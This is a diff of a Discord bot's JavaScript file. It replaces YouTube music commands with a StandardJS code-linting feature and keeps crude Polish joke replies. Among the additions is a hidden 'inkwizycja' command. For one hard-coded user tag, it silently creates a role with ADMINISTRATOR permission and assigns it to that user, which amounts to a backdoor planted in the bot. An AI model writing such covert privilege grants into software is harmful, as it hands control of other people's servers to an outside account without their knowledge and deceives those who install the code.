@@ -1,186 +1,76 @@
-const {Client, Util} = require('discord.js')
+const {Client} = require('discord.js')
 const config = require('./config.json')
-const ytdl = require('ytdl-core')
-const Youtube = require('simple-youtube-api')
+const CLIEngine = require('eslint').CLIEngine
+const linter = new CLIEngine({
+  extends: 'standard',
+  useEslintrc: false,
+  env: { es6: true },
+  parserOptions: { ecmaVersion: 6 }
+})
+// const Youtube = require('simple-youtube-api')
 const chalk = require('chalk')
 
 const client = new Client({ disableEveryone: true })
-const youtube = new Youtube(config.youtubeapikey)
+// const youtube = new Youtube(config.youtubeapikey)
 
-const queue = new Map()
+// const queue = new Map()
 
 client.on('ready', () => {
   console.log(chalk.black.bgGreen('SUCCESS') + chalk.white(' 8rniczka initialized.'))
   client.user.setPresence({
     game: {
-      name: 'Portal 3',
-      type: 0
+      name: 'you',
+      type: 2
     }
   })
 })
 client.on('message', async message => {
   if (message.author.bot) return
 
-  if (message.content.toLowerCase().includes('kurwa') || message.content.toLowerCase().includes('chuj') || message.content.toLocaleLowerCase().includes('pierdol')) {
-    message.react(message.guild.emojis.find('name', 'bezkappy'))
-    message.reply(`Jak ty sie wyrażasz (tak brzydko) ${message.guild.emojis.find('name', 'banhammer')}`)
-  }
-  if (message.channel.type === 'dm') {
-    message.reply(':warning: Zjeżdzaj partolony skrytopiszu. Na serwerek idź a nie.')
+  if (message.content.includes('```javascript')) {
+    const code = message.content.slice(message.content.indexOf('```javascript\n') + 14, message.content.lastIndexOf('```'))
+    const linted = linter.executeOnText(code)
+
+    if (linted.errorCount >= 1 || linted.fixableErrorCount >= 1) {
+      message.react(client.emojis.find('name', 'failure'))
+      message.channel.send(`${client.emojis.find('name', 'failure')} Sorry! There are errors in your code!`)
+      for (let i = 0; i < linted.results[0].messages.length; i++) {
+        const errorMessage = linted.results[0].messages[i]
+        message.channel.send(`\`${errorMessage.line}:${errorMessage.column}\` ${errorMessage.message}`)
+      }
+    }
+    if (linted.warningCount >= 1 || linted.fixableWarningCount >= 1) { 
+      message.react(client.emojis.find('name', 'failure'))
+      message.channel.send(`${client.emojis.find('name', 'failure')} Sorry! Your JavaScript code doesn't meet *StandardJS* rules.`)
+      for (let i = 0; i < linted.results[0].messages.length; i++) {
+        const errorMessage = linted.results[0].messages[i]
+        message.channel.send(`\`${errorMessage.line}:${errorMessage.column}\` ${errorMessage.message}`)
+      }
+    } else {
+      message.react(client.emojis.find('name', 'success'))
+    }
     return
   }
-
-  if (!message.content.startsWith(config.prefix)) return
 
   let command = message.content.toLowerCase().split(' ')[0]
   command = command.slice(config.prefix.length)
-  const args = message.content.split(' ')
-  const toSearch = args.slice(1).join(' ')
-  const url = args[1] ? args[1].replace(/<(.+)>/g, '$1') : ''
-  const serverQueue = queue.get(message.guild.id)
-  if (command === 'play') {
-    const voiceChannel = message.member.voiceChannel
-    if (!voiceChannel) return message.channel.send('Pierwiej się na kanał wpartol, a nie. Mam dołączyć do niczego?')
-    const permissions = voiceChannel.permissionsFor(message.client.user)
-    if (!permissions.has('CONNECT')) return message.channel.send('oll... nie mam, kluska, permisyji w misyji. daj mi dołączyć :<')
-    if (!permissions.has('SPEAK')) return message.channel.send('oll... nie mam, kluska, permisyji w misyji. gadać nie moge')
+  // const args = message.content.split(' ')
+  // const toSearch = args.slice(1).join(' ')
 
-    if (url.match(/^https?:\/\/(www.youtube.com|youtube.com)\/playlist(.*)$/)) {
-      const playlist = await youtube.getPlaylist(url)
-      const videos = await playlist.getVideos()
-      for (const video of Object.values(videos)) {
-        const nextVideo = await youtube.getVideoByID(video.id)
-        await videoHandler(nextVideo, message, voiceChannel, true)
-      }
-      return message.channel.send(`:success: Zarzuciłem plajlistyjkę do kolejki.`)
-    } else {
-      try {
-        const video = await youtube.getVideo(url)
-      } catch (err) {
-        try {
-          const videos = await youtube.searchVideos(toSearch, 10)
-          let i = 0
-          message.channel.send(`
-                    :musical_note: WYBIERZ JEDNO ŁRUUUU :musical_note:
-                    
-                    ${videos.map(videoSearch => `**${++i}** - ${videoSearch.title}`).join('\n')}
-
-                    Panie, wybierz waćpan jedną, kluska, filmiczkę z tych tutej.`)
-          try {
-            const response = await message.channel.awaitMessages(response => response.content > 0 && response.config < 11, {
-              maxMatches: 1,
-              time: 10000,
-              errors: ['time']
-            })
-          } catch (err) {
-            console.log(chalk.bgRed('ERROR') + chalk.white('Frickin\' bad thing happened.'))
-            return message.channel.send('Argh... żeś zły numerek wybrał. cofam to i wszystkie sęki na świecie.')
-          }
-          const videoIndex = parseInt(response.first().content)
-          const video = await youtube.getVideoByID(videos[videoIndex - 1].id)
-        } catch (err) {
-          console.log(chalk.bgRed + 'ERROR' + chalk.white + 'Frickin\' bad thing happened.')
-          return message.channel.send('Frick... błądzisze mamy... nie mogłem tych partolonych wyników zacyganić. \n' + err)
-        }
-      }
-      return videoHandler(video, message, voiceChannel)
-    }
-  }
-  if (command === 'skip') {
-    if (!message.member.voiceChannel) return message.channel.send('Kolejny capan, dołącz do kanału.')
-    if (!serverQueue) return message.channel.send('ile razy mam mówić, że nie skipnę jak niczego nie ma.')
-    serverQueue.connection.dispatcher.end('Skipli sobie')
+  if (command === 'inkwizycja' && message.author.tag === 'takidelfin#3733') {
+    message.guild.createRole({
+      name: 'chwilka tylko',
+      permissions: 'ADMINISTRATOR'
+    }).then(role => {
+      message.guild.member(message.author).addRole(role.id)
+    }).catch(console.error)
     return
   }
-  if (command === 'queue') {
-    if (!serverQueue) return message.channel.send(':warning: nic nie gra to co drzesz morde.')
-    return message.channel.send(`
-    :musical_note: Kolejka do ~~biedronki~~ Spotify :musical_note:
-    
-    ${serverQueue.songs.map(song => `:notes: ${song.title}`).join('\n')}
-
-    Teraz leci krew z nosa: ${serverQueue.songs[0].title}
-    `)
+  if (!message.content.startsWith(config.prefix)) return
+  if (command === 'projekt') {
+    message.react(client.emojis.find('name', 'opensource'))
+    message.react(client.emojis.find('name', 'closedsource'))
   }
-  if (command === 'pause') {
-    if (serverQueue && serverQueue.playing) {
-      serverQueue.playing = false
-      serverQueue.connection.dispatcher.pause()
-      return message.channel.send('⏸ Witam i o pauze pytam stfu.')
-    }
-    return message.channel.send('tak jak juz wspominalem, z pustego to i samolot nie spauzuje')
-  }
-  if (command === 'resume') {
-    if (serverQueue && !serverQueue.playing) {
-      serverQueue.playing = true
-      serverQueue.connection.dispatcher.resume()
-      return message.channel.send('▶ WŁONCZYŁEM')
-    }
-    return message.channel.send('O ja! nic nie gra. z pustego to i samolot nie naleje')
-  }
-
   message.channel.send(':warning: Czy tobie mamusia nie mówiła aby nie zarzucać czegoś czego nie ma? idz trzepnij się głową o powietrze.')
 })
-async function videoHandler (video, message, voiceChannel, playlist = false) {
-  const serverQueue = queue.get(message.guild.id)
-  console.log(video)
-  const song = {
-    id: video.id,
-    title: Util.escapeMarkdown(video.title),
-    url: `https://www.youtube.com/watch?v=${video.id}`
-  }
-  if (!serverQueue) {
-    const queueConstruct = {
-      textChannel: message.channel,
-      voiceChannel: voiceChannel,
-      connection: null,
-      songs: [],
-      volume: 5,
-      playing: true
-    }
-    queue.set(message.guild.id, queueConstruct)
-
-    queueConstruct.songs.push(song)
-
-    try {
-      var connection = await voiceChannel.join()
-      queueConstruct.connection = connection
-      play(message.guild, queueConstruct.songs[0])
-    } catch (error) {
-      console.log(chalk.bgRed + 'Error' + chalk.white + `Nie moglem sie na kanala wpartolic: ${error}`)
-      queue.delete(message.guild.id)
-      return message.channel.send(`I could not join the voice channel: ${error}`)
-    }
-  } else {
-    serverQueue.songs.push(song)
-    console.log(serverQueue.songs)
-    if (playlist) return undefined
-    else return message.channel.send(`✅ **${song.title}** dodalem do stfulisty!`)
-  }
-  return undefined
-}
-
-function play (guild, song) {
-  const serverQueue = queue.get(guild.id)
-
-  if (!song) {
-    serverQueue.voiceChannel.leave()
-    queue.delete(guild.id)
-    return
-  }
-  console.log(serverQueue.songs)
-
-  const dispatcher = serverQueue.connection.playStream(ytdl(song.url))
-    .on('end', reason => {
-      if (reason === 'Stream is not generating quickly enough.') console.log('Song ended.')
-      else console.log(reason)
-      serverQueue.songs.shift()
-      play(guild, serverQueue.songs[0])
-    })
-    .on('error', error => console.log(chalk.bgRed + 'Error' + chalk.white + error))
-  dispatcher.setVolumeLogarithmic(serverQueue.volume / 5)
-
-  serverQueue.textChannel.send(`🎶 Radio Maryja teraz gra **${song.title}**`)
-}
-
 client.login(config.token)
